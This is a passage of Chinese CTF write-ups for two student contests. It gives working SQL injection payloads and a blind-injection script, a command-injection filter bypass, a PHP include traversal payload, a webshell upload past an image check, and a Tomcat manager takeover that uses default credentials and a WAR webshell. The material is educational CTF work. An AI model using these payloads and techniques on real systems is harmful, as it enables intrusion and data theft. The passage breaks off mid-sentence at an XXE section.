<code>Y1ng</code> 师傅指出。而且不是动态靶机应该做一下 <code>sandbox</code>，因为一开始只是想给十几个人打的没想那么多。。。后来还是大意了。</p><p>打开界面就是一个主页，要注册什么的（这里放了一个小彩蛋，不知道大家有没有注意到</p><p><img src="https://s1.ax1x.com/2020/03/30/GnfpnK.png" alt="GnfpnK.png"></p><p>然后注册进去就是一个个人信息的界面，这里非常贴心的把网站所有功能全部去掉了，把头像上传放到了最显眼的地方，那就是文件上传了。</p><p>然后上传一个图片，更改头像后发现f12可以看到文件路径，于是上传一句话试试，发现非常贴心地返回：</p><p><img src="https://s1.ax1x.com/2020/03/30/GnfRHO.png" alt="GnfRHO.png"></p><p>那就是用 exif_imagetype() 来检测是不是图片，这个很简单，文件头加 <code>GIF89a</code> 就可以了，上传上去后缀还是php，这里设置得很简单，然后蚁剑连上去，可以在根目录上有flag。</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnf44H.png" alt="Gnf44H.png"></p><p>但是打开为空，考虑权限问题，但是很贴心地准备了readflag，运行得flag</p><p><img src="https://s1.ax1x.com/2020/03/30/Gnfo8A.png" alt="Gnfo8A.png"></p><h2 id="朴实无华-24-solves"><a href="#朴实无华-24-solves" class="headerlink" title="朴实无华 - 24 solves"></a>朴实无华 - 24 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>枯燥的代码审计，打开是一个 hackme，注意到标题有 <code>人间极乐bot</code>，很容易就知道去 <code>robots.txt</code> 看看，可以得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;fAke_f1agggg.php</span><br></pre></td></tr></table></figure><p>访问发现有个假flag，f12看报文可以察觉到一个头部：</p><p><img src="https://s1.ax1x.com/2020/03/30/GnfICd.png" alt="GnfICd.png"></p><p>于是就进入到朱一旦的枯燥页面。</p><p>接下来就是代码审计了。</p><p><strong>intval</strong></p><p>这个比较常见了，<code>intval()</code> 在处理16进制时存在问题，但强制转换时是正常的，intval(字符串)为0，但是intval(字符串+1) 会自动转换成数值的，php7里面修复了这个东西，这里输入 <code>0x1234</code> 即可绕过。</p><p><strong>MD5</strong></p><p>这个考察php的弱等于，当两边为0e的时候，php会解析为0，当然 0e 后面得是数字。</p><p>写个脚本跑个几分钟就有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> dict_az</span><br><span class="line">dict_az = <span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">result = <span class="string">'0e'</span></span><br><span class="line">result += str(i)</span><br><span class="line">i = i + <span class="number">1</span></span><br><span class="line">hashed_s = hashlib.md5(result.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">r = re.match(<span class="string">'^0e[0-9]&#123;30&#125;'</span>, hashed_s)</span><br><span class="line"><span class="keyword">if</span> r:</span><br><span class="line">print(<span class="string">"[+] found! md5( &#123;&#125; ) ---&gt; &#123;&#125;"</span>.format(result, hashed_s))</span><br><span class="line">exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> i % <span class="number">1000000</span> == <span class="number">0</span>:</span><br><span class="line">print(<span class="string">"[+] current value: &#123;&#125;       &#123;&#125; iterations, continue..."</span>.format(result, str(i)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0e215962017</span></span><br></pre></td></tr></table></figure><p><strong>命令执行</strong></p><p>这里过滤了空格和cat，空格的话一搜就有很多，比如 <code>%09</code>，<code>${IFS}</code>等等，这里用 <code>%09</code> 为例，cat的话换成tac就可以了。</p><p>首先 ls 一下看见那个巨傻的flag名，然后 <code>tac%09flll*</code> 就可以读到flag了。</p><h2 id="颜值成绩查询-14-solves"><a href="#颜值成绩查询-14-solves" class="headerlink" title="颜值成绩查询 - 14 solves"></a>颜值成绩查询 - 14 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>常规的 sql 注入题目，这里过滤了空格和union，同时检查了 UA，带 <code>sqlmap</code> 的就 die，所以无脑 <code>sqlmap</code> 是不行的。</p><p>解法：用 <code>/**/</code> 代替空格，双写 union 绕过: <code>uniunionon</code></p><p>首先用order by把列数猜出来，这里是3，union 查询必须列数相等。</p><p>然后查表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()</span><br><span class="line">绕过方式如上</span><br></pre></td></tr></table></figure><p>查列</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_name=flag</span><br><span class="line">绕过方式如上</span><br></pre></td></tr></table></figure><p>可以发现flag表中有flag和value，直接查value即可。</p><p>payload: </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?stunum=-1<span class="comment">/**/</span>uniounionn<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="keyword">value</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>后来发现好多人是盲注跑出来的，当然也可以，这里给出 <code>Y1ng</code> 师傅的 <code>exp</code>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#颖奇L'Amore www.gem-love.com #转载请勿删除水印</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line">alphabet = [<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>, <span class="string">'@'</span>, <span class="string">'_'</span>,<span class="string">','</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'j'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'g'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'G'</span>,<span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,<span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'Z'</span>,<span class="string">'0'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> alphabet:</span><br><span class="line"><span class="comment"># information_schema,ctf</span></span><br><span class="line"><span class="comment"># payload = "select/**/group_concat(schema_name)/**/from/**/information_schema.schemata"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag,score</span></span><br><span class="line"><span class="comment"># payload = "select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()" </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag,value,id,name,score</span></span><br><span class="line"><span class="comment"># payload = 'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#wctf2020&#123;e@sy_sq1_and_y0u_sc0re_1t&#125;</span></span><br><span class="line">payload = <span class="string">"select/**/group_concat(value)/**/from/**/flag"</span></span><br><span class="line">payload = quote(payload)</span><br><span class="line">url=<span class="string">'http://101.200.53.102:10114/?stunum=2/(ascii(substr((&#123;&#125;),&#123;&#125;,1))=&#123;&#125;)'</span>.format(payload, i, ord(char))</span><br><span class="line">r = requests.get(url)</span><br><span class="line"><span class="comment"># print(r.text[2473:2499])</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'666'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">res += char</span><br><span class="line">print(res)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="easyweb-23-solves"><a href="#easyweb-23-solves" class="headerlink" title="easyweb - 23 solves"></a>easyweb - 23 solves</h2><blockquote><p>Author: longofo</p></blockquote><p>这个题目考点就是上个月 tomcat 的 CVE，也是比赛前一天才决定放上去的，一开始我只想着读个flag就算了，但学长觉得直接读太没意思了，事实证明确实如此。</p><p>解题：配合上传文件，任意类型都可以，然后利用ajp在uri路径带jsp后缀时包含上传的文件并解析为jsp，通过rce，用命令find匹配flag。</p><p>一开始是想提示具体漏洞的，但是后来发现有几个师傅都做出来了就觉得还是可以的。</p><p>首先就是用 poc 读发现可以读到</p><p><img src="https://s1.ax1x.com/2020/03/30/GnhPK0.png" alt="GnhPK0.png"></p><p>预期解是上传一个🐎，执行后回显，然后通过poc去读自己的🐎，但是因为是临时出题，所以有了一些非预期解，有师傅找到我说读 <code>/home/tomajp/.bashrc_history</code> 可以读到flag的位置。。。这个是真的没想到</p><p>下面是预期解解法：</p><p><img src="https://s1.ax1x.com/2020/03/30/GnhAVU.png" alt="GnhAVU.png"></p><p>然后用poc读命令，本地测试 <code>ipconfig</code> ，可以得到回显。</p><p><img src="https://s1.ax1x.com/2020/03/30/GnhFbT.png" alt="GnhFbT.png"></p><p>这样直接执行 find 命令来找 flag 的字眼，就可以在根目录上找到有一个叫 <code>flaaaag</code> 的目录，目录里面有一个 <code>what_you_want</code> 的文件，执行命令 <code>cat /flaaaag/what_you_want</code> 即可读到flag。</p><h2 id="train-yourself-to-be-godly-1-solves"><a href="#train-yourself-to-be-godly-1-solves" class="headerlink" title="train yourself to be godly - 1 solves"></a>train yourself to be godly - 1 solves</h2><blockquote><p>Author: longofo</p></blockquote><p>页面是 examples，其实洞不在这里，好像一般人很难想得到，肯定得需要 hint，于是就有了 Orange 大哥在 BlackHat 上的一个议题，就是那个 pdf，主要内容就是URL路径参数不规范引发的问题，能造成的危害如下</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4CJH.png" alt="Gn4CJH.png"></p><p>apache中的<code>tomcat/webapps</code>目录如下。</p><p>既然题目是用了examples目录作为网站根目录，那么上图中的Web容器控制台和管理界面这一点就显得很有意思了</p><p><img src="https://s1.ax1x.com/2020/03/30/GnhzdO.png" alt="GnhzdO.png"></p><p>manage目录是可以上传WAR文件部署服务，也就是说可以通过manage目录实现文件上传，继而实现木马上传，也就是第二个hint。</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4FSA.png" alt="Gn4FSA.png"></p><p>我们可以看到 pdf 有一个这样的东西，告诉我们可以通过 <code>/..;/manager/html</code> 进入到manager页面。</p><p>并且随便加一串路径，根据报错信息知道我们当前的tomcat的root路径为examlpes</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn49Fe.png" alt="Gn49Fe.png"></p><p>目录穿越到 manager 得输入密码验证，这里是弱密码 <code>tomcat/tomcat</code> </p><p><img src="https://s1.ax1x.com/2020/03/30/Gn43yq.png" alt="Gn43yq.png"></p><p>接下来就是上传 war 包拿 webshell，github挑一个就好了，这里用 LandGrey 的。</p><p>可以直接用<code>jar cvf yourname.war webshell.jsp</code>命令将webshell.jsp打包成war</p><p>选择文件，上传。</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn41ln.png" alt="Gn41ln.png"></p><p>根据报错信息明显路径拼结完是example/manager/html/upload，缺少一个/..;/，加一个再试</p><p>返回一个403，这说明/manager/html/upload路径访问到了，但是权限不够，那一般问题就出在cookie或者session没给，www没有目录访问权限身上。按照目前的思路来说，不会出现服务器权限不足的问题，那就只能是cookie没添。利用burpsuit从头开始抓包，在访问<code>/..;/manager/html</code>出现了Set-Cookie(set-Cookie的Path是指此cookie只在Path目录下起作用)，那么我们403的问题就迎刃而解，只需要将/example换成Path参数指定的/manage就行，再把cookie加上就完事了。</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4lSs.png" alt="Gn4lSs.png"></p><p>修改post，添加cookie（ps: 由于cookie只能用一次，所以还是403的话，再请求一次<code>/..;/manager/html</code>，更换新的cookie就行了 ），上传完毕后可以看到war已安装好了，访问上传的war，注意这里还有一个<code>/..;/</code>的坑，剩下的就是根据自己的马找flag了。</p><p>当然直接找flag是找不到的，这道题我改得比较玄学，加了《圣经》新约：《提摩太后书》里的文章。（逃</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4MWj.png" alt="Gn4MWj.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/Gn4UkF.png" alt="Gn4UkF.png"></p><p>可以看到在Timothy里面，cat 一下，是一段文章，这里知道flag格式，grep一下 wctf2020，就可以看到flag了。</p><p><img src="https://s1.ax1x.com/2020/03/30/GnXUzT.png" alt="GnXUzT.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/GnXYiq.png" alt="GnXYiq.png"></p><p>In the end, train yourself to be godly.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUps </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wust闲得蛋疼春节瞎欢乐赛_官方WriteUp</title>
      <link href="2020/02/08/wust_funnyctf_WriteUp/"/>
      <url>2020/02/08/wust_funnyctf_WriteUp/</url>
      
        <content type="html"><![CDATA[<p>因为疫情的原因，大家在家闲着(大家内心：并不)也是闲着，不如就搭建一个平台，找一些签到题来训练一下新人，至少让新人知道比赛的流程还有一些注意事项，一些基本的操作等，题目来源于各种开源代码，包括南邮的校赛和suctf的题目。</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h3><p>顾名思义，就是Web的签到题，但我没有想到比隔壁稍微复杂一点的签到题更少人解出来，有点出乎意料。以后这种就不能丢。</p><p>题目描述是：去百度签个到吧。这题来源于<code>NCTF2018</code>的签到题，打开题目链接，就是百度，但是我们注意到地址栏上面的是 <code>/secret.php</code>，按理说应该是 <code>index.php</code> 或者后面为空，这就心生怀疑，于是打开 <code>Burpsuite</code> 等抓包工具一步一步来，这里为了简便我直接用浏览器的<code>f12</code>，这个方法更简单更快。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD1r4.png" alt="1RD1r4.png"></p><p>我们鼠标放在题目链接的时候细心可以注意到链接是 <code>www.cohacker.cn:5011</code>，但是我们打开的界面是 <code>/secret.php</code>，这就有点不对劲。打开<code>f12</code>，访问 <code>www.cohacker.cn:5011</code> ，可以看到有一个 <code>302</code> 跳转，查看头就可以找到 <code>flag</code> 了。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDGZ9.png" alt="1RDGZ9.png"></p><p>因为有个跳转，所以大家可能抓的时候没留意，并且要看 <code>Response</code> 头部，可能都看 <code>secret.php</code> 的头部去了。</p><h3 id="Crossover"><a href="#Crossover" class="headerlink" title="Crossover"></a>Crossover</h3><p>这题是 <code>HCTF2018</code> 的签到题(又是签到题)，主要考点是 <code>include()</code> 文件包含的漏洞和目录穿越，打开题目又是熟悉的滑稽，常规操作查看源代码。</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDK2T.png" alt="1RDK2T.png"></p><p>发现有 <code>source.php</code>，访问可得源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>REQUSET</code> 时需要传参 <code>file</code> ，并且需要是字符串，同时要过 <code>checkFile</code> 的函数检测，分析代码我们可以看到白名单，只能传 <code>source.php</code> 和 <code>hint.php</code>。可以利用<code>?</code>截取<code>hint.php</code>，然后利用<code>/</code>使<code>hint.php?</code>成为一个不存在的目录，最后<code>include</code>利用<code>../../</code>跳转目录读取flag。访问<code>hint.php</code>得到 <code>flag not here, and flag in ffffllllaaaagggg</code>，于是构造payload：<code>http://49.235.15.37:8081/index.php?file=hint.php?/../../../../../../../../../ffffllllaaaagggg</code> 得到flag。</p><h3 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h3><p>点击链接，直接就可以看见源码，对源码进行一波分析：</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDJaR.png" alt="1RDJaR.png"></p><p>通过分析，大致可以了解到这里需要传入参数 <code>value</code>，满足与<code>whoami</code>的值相同要满足10次，且要绕过md5函数</p><p>所以这里value传入数组，用来绕过MD5函数(当然爆破出符合的md5也行)。且开始时<code>whoami</code>里面的值为‘ea’，所以构造如下：</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDYI1.png" alt="1RDYI1.png"></p><p>（此时发现页面的开头又回显出两个新的字母，然后将ea改为这两个字母）</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDNPx.png" alt="1RDNPx.png"></p><p>再次构造<code>url</code>为：<code>?value[]=qk</code> (注意，每个人回显的都不一样，在2分钟内重复这样的操作10次就能拿到flag</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDdxO.png" alt="1RDdxO.png"></p><p>写脚本也是很快的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="string">''' # 这是爆破md5的方法，这里也可以不用</span></span><br><span class="line"><span class="string">def get_value(given):</span></span><br><span class="line"><span class="string">global dict_az</span></span><br><span class="line"><span class="string">for i in range(1000000):</span></span><br><span class="line"><span class="string">result = given</span></span><br><span class="line"><span class="string">result += random.choice(dict_az)</span></span><br><span class="line"><span class="string">result += random.choice(dict_az)</span></span><br><span class="line"><span class="string">result += random.choice(dict_az)</span></span><br><span class="line"><span class="string">result += random.choice(dict_az)</span></span><br><span class="line"><span class="string">result += random.choice(dict_az)</span></span><br><span class="line"><span class="string">m = hashlib.md5(result)</span></span><br><span class="line"><span class="string">m = m.hexdigest()</span></span><br><span class="line"><span class="string">if m[5:9] == "0000":</span></span><br><span class="line"><span class="string">print("success")</span></span><br><span class="line"><span class="string">print(m)</span></span><br><span class="line"><span class="string">return result</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">pass</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(url_s)</span>:</span></span><br><span class="line">session = requests.Session()</span><br><span class="line">result = <span class="string">"ea"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">url = url_s</span><br><span class="line">resp = session.get(url+result)</span><br><span class="line">the_page = resp.text</span><br><span class="line"><span class="comment"># result = get_value(the_page[0:2])</span></span><br><span class="line">result = the_page[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">print(<span class="string">"nums = %d"</span> % i)</span><br><span class="line">index_1 = the_page.find(<span class="string">"wctf"</span>)</span><br><span class="line">index_2 = the_page.find(<span class="string">"&#125;"</span>)</span><br><span class="line">print(the_page[index_1:index_2+<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">dict_az = <span class="string">"abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">url = <span class="string">"http://www.cohacker.cn:23123/challenge13.php?value[]="</span></span><br><span class="line">main(url)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/08/1RDOzT.png" alt="1RDOzT.png"></p><h3 id="男人就要快："><a href="#男人就要快：" class="headerlink" title="男人就要快："></a>男人就要快：</h3><p>进入链接，看到页面：</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDBse.png" alt="1RDBse.png"></p><p>（英语不好的，直接放百度翻译翻译一下）</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDydA.png" alt="1RDydA.png"></p><p>大致意思呢就是提交’true’或者’false’，判断页面的那个式子是否正确，需要连续判断20次，且每一次都要判断正确（这里有个小坑就是，不是让你提交最后的结果，而是提交true或者false），还有一个小坑就是需要在1-2s内提交（注意，提交需要超过一秒，但是不能慢于两秒）</p><p>所以，这里是用Python脚本来处理（需要了解的模块，<code>request</code>， <code>re</code>或者<code>BeautifulSoup</code>，<code>time</code>模块）</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD2JP.png" alt="1RD2JP.png"></p><p>20s之后，就可以拿到flag</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDRRf.png" alt="1RDRRf.png"></p><h3 id="你太闲了"><a href="#你太闲了" class="headerlink" title="你太闲了"></a>你太闲了</h3><p><img src="https://s2.ax1x.com/2020/02/08/1RDWz8.png" alt="1RDWz8.png"></p><p>一开始就这样一个界面，我们去看一下前端的代码：<img src="https://s2.ax1x.com/2020/02/08/1RDhQS.png" alt="1RDhQS.png"></p><p><img src="https://s2.ax1x.com/2020/02/08/1RD4sg.png" alt="1RD4sg.png"></p><p>我们页面随便输一下内容</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD5LQ.png" alt="1RD5LQ.png"></p><p>发现它将 <code>UserName</code> 的内容输出到页面上，跟XML有关的漏洞，我们这里尝试使用XXE（外部实体注入）漏洞—OWASP TOP 10 